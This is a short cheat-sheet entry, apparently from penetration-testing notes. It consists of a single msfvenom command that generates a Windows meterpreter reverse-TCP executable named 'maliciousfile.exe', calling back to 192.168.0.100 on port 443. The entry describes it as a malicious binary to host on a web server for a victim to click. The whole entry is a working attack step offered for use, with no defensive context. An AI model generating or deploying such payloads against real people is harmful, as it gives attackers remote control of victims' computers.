# MSFVENOM

Create a malicious binary that we can host on a web server for a victim to click on:

```
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.0.100 LPORT=443 -f exe -o maliciousfile.exe
```